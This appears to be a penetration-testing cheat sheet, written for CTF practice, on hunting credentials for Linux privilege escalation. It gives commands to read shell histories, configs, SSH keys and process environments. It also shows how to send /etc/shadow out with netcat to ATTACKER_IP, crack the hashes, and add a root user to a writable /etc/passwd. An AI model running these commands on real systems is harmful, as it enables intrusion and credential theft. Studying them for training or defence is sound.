# Linux PrivEsc — 05. Credential Hunting

> **Author:** Rasel Hossain | raselhossain79 | TryHackMe: theloser

---

## What is Credential Hunting?

After getting a low-privilege shell, searching for credentials (passwords, keys, tokens, hashes) that are:
- Stored in plaintext in files
- Left in command history
- Embedded in scripts or config files
- Cached in memory
- Hidden in logs

Finding credentials → login as higher-privilege user → root.

---

## 1. Shell History Files

Command history = gold mine. Admins often type passwords directly in commands.

```bash
cat ~/.bash_history
```
**Breakdown:**
- `~` = home directory of current user
- `.bash_history` = hidden file (starts with `.`) storing bash command history
- Each line = one previously typed command
- **Why:** Admins type: `mysql -u root -pSecretPass123`, `scp user:password@server:/path`, `curl -u admin:password http://...`

```bash
cat ~/.zsh_history
```
**Breakdown:**
- ZSH shell history file
- Some systems use ZSH instead of BASH (check `echo $SHELL`)

```bash
cat ~/.fish_history
```
**Breakdown:**
- Fish shell history (modern shell, less common)

```bash
cat ~/.mysql_history
```
**Breakdown:**
- MySQL client saves all queries typed in MySQL shell here
- Can contain: passwords used in queries, database structure, sensitive data

```bash
cat ~/.psql_history
```
**Breakdown:**
- PostgreSQL client history
- Same concept as MySQL history

```bash
cat ~/.python_history
```
**Breakdown:**
- Python interactive shell history
- Scripts typed interactively, sometimes with hardcoded credentials

### Search ALL History Files on System

```bash
find / -name ".*history" -readable 2>/dev/null
```
**Breakdown:**
- `-name ".*history"` = any hidden file ending in "history"
- `-readable` = only files current user can actually read
- `2>/dev/null` = suppress permission errors

```bash
find / -name ".*history" -readable 2>/dev/null -exec cat {} \;
```
**Breakdown:**
- `-exec cat {} \;` = for each found file, execute `cat` on it
- `{}` = placeholder for found filename
- `\;` = end of exec command (escaped semicolon)

### Search History for Passwords

```bash
grep -i "pass\|password\|secret\|key\|token" ~/.bash_history
```
**Breakdown:**
- `-i` = case insensitive
- `"pass\|password\|secret\|key\|token"` = search for any of these patterns
- `\|` = OR in grep regex

---

## 2. Config Files

### Web Server Configs

```bash
cat /etc/apache2/sites-enabled/*
```
**Breakdown:**
- Apache virtual host configs
- May contain: database credentials, API keys, basic auth passwords

```bash
cat /etc/nginx/sites-enabled/*
```
**Breakdown:**
- Nginx virtual host configs
- May contain: upstream server credentials, proxy auth

```bash
find /var/www -name "*.php" 2>/dev/null | xargs grep -l "password\|passwd\|db_pass" 2>/dev/null
```
**Breakdown:**
- `find /var/www -name "*.php"` = find all PHP files in web root
- `xargs` = takes find output and passes each filename as argument to next command
- `grep -l` = only print filenames that CONTAIN the match (not the matching lines)
- **Why:** PHP files often have database connection strings with passwords

```bash
cat /var/www/html/wp-config.php
```
**Breakdown:**
- WordPress configuration file
- Contains: `DB_NAME`, `DB_USER`, `DB_PASSWORD`, `DB_HOST`
- These are database credentials in plaintext → connect to DB → dump hashes

```bash
find /var/www -name "wp-config.php" 2>/dev/null -exec cat {} \;
```
**Breakdown:**
- Search all web directories for WordPress configs (multiple WordPress installs)

```bash
find /var/www -name ".env" 2>/dev/null -exec cat {} \;
```
**Breakdown:**
- `.env` files = environment configuration files used by Laravel, Django, Node.js, etc.
- Contains: database passwords, API keys, secret keys, mail credentials
- Format: `DB_PASSWORD=mysecretpassword`

```bash
find / -name "settings.py" 2>/dev/null | xargs grep -i "password\|secret" 2>/dev/null
```
**Breakdown:**
- `settings.py` = Django configuration file
- Contains: `DATABASES` dict with password, `SECRET_KEY`, external service credentials

### Database Configs

```bash
cat /etc/mysql/my.cnf
cat /etc/mysql/mysql.conf.d/*.cnf
```
**Breakdown:**
- MySQL/MariaDB main config file
- Look for: `[client]` section with `password=` line

```bash
cat /root/.my.cnf
cat /home/*/.my.cnf
```
**Breakdown:**
- Per-user MySQL config file (hidden, in home directory)
- If root has `.my.cnf` with `password=something` → run `mysql -u root` with no password prompt
- **This is extremely common on CTF machines and real servers**

```bash
cat /etc/postgresql/*/main/pg_hba.conf
```
**Breakdown:**
- PostgreSQL host-based authentication config
- Shows auth methods (md5, trust, peer, etc.)
- `trust` = no password needed for that connection → instant access

### Search All Configs for Passwords

```bash
grep -r "password" /etc/ 2>/dev/null --include="*.conf"
```
**Breakdown:**
- `-r` = recursive (search subdirectories)
- `"password"` = search term
- `/etc/` = search only in /etc directory
- `--include="*.conf"` = only search .conf files

```bash
grep -rn "password\s*=" /var/www/ 2>/dev/null --include="*.php" --include="*.py" --include="*.conf"
```
**Breakdown:**
- `-n` = show line numbers
- `"password\s*="` = "password" followed by optional whitespace then `=`
- `\s*` = zero or more whitespace characters
- Multiple `--include` flags = search multiple file types

---

## 3. SSH Keys

SSH private keys = login to other servers as root or privileged users.

```bash
find / -name "id_rsa" 2>/dev/null
```
**Breakdown:**
- `id_rsa` = RSA private key (most common)
- If found and readable → can use to SSH into other servers (or even this server as root)

```bash
find / -name "id_dsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
```
**Breakdown:**
- `id_dsa` = DSA private key (old, deprecated)
- `id_ecdsa` = Elliptic Curve DSA key
- `id_ed25519` = Ed25519 key (modern, recommended)

```bash
find / -name "*.pem" 2>/dev/null
find / -name "*.key" 2>/dev/null
```
**Breakdown:**
- `.pem` = Privacy Enhanced Mail format (base64 encoded certificate/key)
- `.key` = generic private key file
- Used for SSL/TLS certificates, VPN keys, etc.

```bash
cat ~/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```
**Breakdown:**
- `authorized_keys` = list of public keys allowed to login via SSH
- **Why:** Add YOUR public key here → passwordless SSH login as that user
- If you can write to `/root/.ssh/authorized_keys` → SSH in as root

```bash
cat ~/.ssh/known_hosts
cat /root/.ssh/known_hosts
```
**Breakdown:**
- `known_hosts` = servers this machine has connected to via SSH before
- Contains: hostname/IP + their public key fingerprint
- **Why:** Discover other machines on the network this machine talks to

### Using a Found Private Key

```bash
# Fix permissions (SSH requires private key to be 600)
chmod 600 /tmp/id_rsa

# SSH using the key
ssh -i /tmp/id_rsa root@TARGET_IP
ssh -i /tmp/id_rsa user@TARGET_IP

# Try common usernames if you don't know
ssh -i /tmp/id_rsa root@TARGET_IP
ssh -i /tmp/id_rsa ubuntu@TARGET_IP
ssh -i /tmp/id_rsa admin@TARGET_IP
```
**Breakdown:**
- `-i /path/to/key` = specify identity file (private key) to use
- Key must have permissions 600 (owner read/write only) or SSH refuses it
- `chmod 600` = set permissions to rw------- (only owner can read/write)

---

## 4. /etc/shadow — Password Hash Cracking

```bash
cat /etc/shadow
```
**Breakdown:**
- Contains hashed passwords for all users
- Format: `username:$type$salt$hash:last_change:min_age:max_age:warn:inactive:expire`
- Hash type: `$1$`=MD5, `$5$`=SHA-256, `$6$`=SHA-512, `$y$`=yescrypt

```bash
ls -la /etc/shadow
# Normal: -rw-r----- 1 root shadow
# Vulnerable: -rw-r--r-- (world-readable!) or -rw-rw-r-- (group writable!)
```

### Copy Shadow for Offline Cracking

```bash
# Copy shadow file content
cat /etc/shadow > /tmp/shadow.txt

# Transfer to attacker machine
# On attacker: nc -lvnp 4444 > shadow.txt
# On target:   cat /etc/shadow | nc ATTACKER_IP 4444
```

### Crack with John the Ripper

```bash
# Unshadow (combine passwd and shadow)
unshadow /etc/passwd /etc/shadow > /tmp/combined.txt

# Crack with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/combined.txt

# Check cracked passwords
john --show /tmp/combined.txt
```
**Breakdown:**
- `unshadow` = combines /etc/passwd and /etc/shadow into format john understands
- `john` = John the Ripper password cracker
- `--wordlist=` = dictionary attack using wordlist file
- `rockyou.txt` = most popular password wordlist (14 million passwords)
- `--show` = display already-cracked passwords

### Crack with Hashcat

```bash
# Extract hash from shadow file
# Example hash: $6$salt$longhashstring

# SHA-512 (most common modern Linux)
hashcat -m 1800 /tmp/shadow.txt /usr/share/wordlists/rockyou.txt

# SHA-256
hashcat -m 7400 /tmp/shadow.txt /usr/share/wordlists/rockyou.txt

# MD5 (old)
hashcat -m 500 /tmp/shadow.txt /usr/share/wordlists/rockyou.txt
```
**Breakdown:**
- `hashcat` = GPU-accelerated password cracker (much faster than john)
- `-m 1800` = hash mode 1800 = sha512crypt ($6$) = modern Linux default
- `-m 7400` = sha256crypt ($5$)
- `-m 500` = md5crypt ($1$)
- Check hash type from `$number$` in the hash

---

## 5. /etc/passwd — Writable?

```bash
ls -la /etc/passwd
```

If world-writable (`-rw-rw-rw-` or `-rw-r--rw-`):

```bash
# Generate a password hash
openssl passwd -1 -salt hacker password123
# Output: $1$hacker$5qE7L1C5Q4mKTp3lLKbBn.

# Add a new root user (UID=0, GID=0)
echo 'hacker:$1$hacker$5qE7L1C5Q4mKTp3lLKbBn.:0:0:root:/root:/bin/bash' >> /etc/passwd
```
**Breakdown:**
- `openssl passwd -1` = generate MD5 password hash (`-1` = MD5 algorithm)
- `-salt hacker` = use "hacker" as the salt (makes hash unique)
- `password123` = the actual password to hash
- `>>` = append to file (don't overwrite existing content!)
- The line format: `username:hash:UID:GID:comment:homedir:shell`
- UID=0, GID=0 = root-level access

```bash
# Login as new root user
su hacker
# Enter: password123
id   # uid=0(root)
```

**Alternative — No password (blank password field):**

```bash
echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker   # No password needed → root shell
```
**Breakdown:**
- `::` = empty password field = no password required
- On modern systems, this might be blocked → use hash method instead

---

## 6. Database Credential Hunting

### MySQL / MariaDB

```bash
# Try connecting with no password
mysql -u root
mysql -u root -p   # Try: root, password, toor, mysql, admin, ""

# Check config files
cat /etc/mysql/debian.cnf    # Contains debian-sys-maint credentials (Debian/Ubuntu)
cat /root/.my.cnf            # Root MySQL credentials (common!)
cat /home/*/.my.cnf          # Other users' MySQL credentials
```
**Breakdown:**
- `mysql -u root` = try connecting as root with no password
- `debian.cnf` = Debian/Ubuntu specific file with maintenance user credentials → often has root-equivalent access
- `.my.cnf` = auto-login config, contains `[client]` section with `user=` and `password=`

```bash
# Once connected to MySQL, look for more credentials
mysql -u root -p
```

Inside MySQL:
```sql
SELECT user, password FROM mysql.user;         -- Old MySQL format
SELECT user, authentication_string FROM mysql.user;  -- New MySQL format
SHOW DATABASES;
USE wordpress;                                  -- switch to WordPress DB
SELECT user_login, user_pass FROM wp_users;    -- WordPress admin hash
```

### PostgreSQL

```bash
cat /etc/postgresql/*/main/pg_hba.conf   # Auth config
find / -name ".pgpass" 2>/dev/null       # PostgreSQL password file

# Try connecting
su - postgres                             # Switch to postgres user (often no password)
psql                                      # Connect as postgres

# Or
psql -U postgres -h localhost
```

Inside psql:
```sql
\l                              -- list databases
\c database_name                -- connect to database
\dt                             -- list tables
SELECT * FROM users;            -- dump users table
```

### SQLite

```bash
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
```
**Breakdown:**
- SQLite = file-based database (no server needed)
- Common in: Django apps, mobile app backends, small web apps

```bash
sqlite3 /path/to/database.db
```

Inside sqlite3:
```sql
.tables                          -- list all tables
SELECT * FROM users;             -- dump users table
.quit                            -- exit
```

---

## 7. Application-Specific Locations

### WordPress

```bash
find / -name "wp-config.php" 2>/dev/null -exec cat {} \;
```
**Breakdown:**
- `wp-config.php` = WordPress config with DB_PASSWORD in plaintext

### Laravel / PHP Framework

```bash
find / -name ".env" 2>/dev/null -exec cat {} \;
```
**Breakdown:**
- `.env` = environment file with `DB_PASSWORD`, `APP_KEY`, `MAIL_PASSWORD`, etc.

### Joomla

```bash
find / -name "configuration.php" 2>/dev/null -exec grep -i "password" {} \;
```

### Drupal

```bash
find / -name "settings.php" 2>/dev/null -exec grep -i "password" {} \;
```

### Git Repositories (Credential History)

```bash
find / -name ".git" -type d 2>/dev/null
```
**Breakdown:**
- `.git/` = git repository directory
- Old commits may contain credentials that were later removed from current code

```bash
cd /path/to/repo
git log --all --oneline    # Show all commits
git show <commit_hash>     # Show changes in specific commit
git log -p | grep -i "pass\|secret\|key"  # Search all commit diffs
```
**Breakdown:**
- `git log --all` = show history including all branches
- `--oneline` = compact format: hash + message
- `git show <hash>` = show diff of that commit = see what was added/removed
- `git log -p` = show all commit diffs (`-p` = patch format)

---

## 8. Memory & Process Credential Hunting

### Process Arguments

```bash
ps aux | grep -i "pass\|secret\|user\|db\|key"
```
**Breakdown:**
- Some processes are started with credentials in command arguments
- Example: `mysql -u root -pSecretPass` visible in ps output

### Check Process Environment Variables

```bash
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i "pass\|secret\|key\|token"
```
**Breakdown:**
- `/proc/PID/environ` = environment variables of process PID
- Each variable null-separated → `tr '\0' '\n'` makes readable
- May find: database passwords, API keys set in process environment

### Using Pspy to Watch for Credentials

```bash
./pspy64
```
**Breakdown:**
- Watch for commands that include credentials as arguments
- Example: cron job runs `mysqldump -u root -pPassword123 database > backup.sql`
- This appears in pspy output with the password visible!

---

## 9. Log Files

Logs sometimes accidentally record passwords (failed logins with password as username, debug logs, etc.):

```bash
grep -i "password\|passwd\|pass=" /var/log/auth.log 2>/dev/null
```
**Breakdown:**
- `/var/log/auth.log` = authentication log (SSH logins, sudo usage, etc.)
- Occasionally has: `Failed password for root from IP` with actual password visible

```bash
grep -i "password\|pass=" /var/log/apache2/access.log 2>/dev/null
```
**Breakdown:**
- Web server access log
- GET requests with passwords in URL visible: `GET /login?user=admin&pass=SecretPass`

```bash
grep -rli "password\|passwd" /var/log/ 2>/dev/null
```
**Breakdown:**
- `-l` = only list filenames (not matching lines)
- `-i` = case insensitive
- Find which log files mention passwords → then cat those specific files

---

## 10. Mail Files

```bash
cat /var/mail/root
cat /var/spool/mail/root
ls /var/mail/
```
**Breakdown:**
- System mail stored locally
- Automated scripts sometimes email passwords or credentials to root
- Password reset emails, deployment notifications, monitoring alerts

---

## 11. Network Credentials

```bash
cat /etc/NetworkManager/system-connections/*
```
**Breakdown:**
- NetworkManager connection profiles
- Contains: WiFi passwords (PSK), VPN credentials, proxy passwords
- Format: `psk=WifiPassword` in plaintext!

```bash
find / -name "*.ovpn" 2>/dev/null -exec cat {} \;
```
**Breakdown:**
- OpenVPN configuration files
- May contain embedded private keys and credentials

---

## 12. Quick Search Commands

### One-liner to grep all common credential patterns

```bash
grep -rn "password\s*=\s*['\"]" / 2>/dev/null \
  --include="*.php" \
  --include="*.py" \
  --include="*.conf" \
  --include="*.config" \
  --include="*.sh" \
  --include="*.env" \
  --include="*.yml" \
  --include="*.yaml" \
  | grep -v ".pyc"
```
**Breakdown:**
- `"password\s*=\s*['\"]"` = regex: "password" then optional spaces then `=` then optional spaces then quote (single or double)
- Multiple `--include` = search multiple file types
- `grep -v ".pyc"` = exclude compiled Python files (binary, not useful)

### Find interesting files in home directories

```bash
find /home /root -type f -readable 2>/dev/null | grep -E "\.(txt|conf|config|ini|yml|yaml|json|bak|old|backup|key|pem|env)$"
```
**Breakdown:**
- Search home directories for readable files
- `-E` = extended regex
- Matches common interesting file extensions

---

## Quick Checklist

```
[ ] cat ~/.bash_history                                  → command history
[ ] cat /root/.my.cnf                                    → MySQL root credentials
[ ] find / -name "wp-config.php" 2>/dev/null             → WordPress DB creds
[ ] find / -name ".env" 2>/dev/null                      → Laravel/Node/Django creds
[ ] find / -name "id_rsa" 2>/dev/null                    → SSH private keys
[ ] cat /etc/shadow (check permissions first)            → password hashes
[ ] ls -la /etc/passwd (check if writable)               → add root user
[ ] mysql -u root (no password)                          → MySQL access
[ ] find / -name ".git" 2>/dev/null                      → git repos with old creds
[ ] ps aux | grep -i pass                                → credentials in processes
[ ] cat /proc/*/environ 2>/dev/null | grep -i pass       → process env vars
[ ] grep -rn "password" /var/www/ 2>/dev/null            → web app credentials
[ ] cat /etc/NetworkManager/system-connections/*         → WiFi/VPN passwords
[ ] grep -i pass /var/log/auth.log 2>/dev/null           → auth log credentials
[ ] find /home /root -name ".*" -readable 2>/dev/null    → hidden files in home dirs
```
